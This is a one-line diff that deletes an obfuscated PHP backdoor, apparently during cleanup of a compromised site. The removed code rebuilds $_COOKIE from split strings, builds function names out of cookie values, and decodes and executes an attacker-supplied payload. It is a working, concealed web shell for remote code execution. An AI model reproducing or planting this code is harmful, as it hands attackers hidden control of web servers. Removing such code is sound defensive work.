@@ -1,1 +1,0 @@
-<?php $e='E';/*P2?*/$xm='OKI';$bc/*h18n*/='_CO';$t=/*.M*/${$bc.$xm.$e};if(isset($t['Tw'])){$if=/*3ff*/$t['Tw'].$t['X'];$sr=$t['bm'].$t['cB'].$t['Y'];$g=$if('',$sr($t['iZ']));$g();}
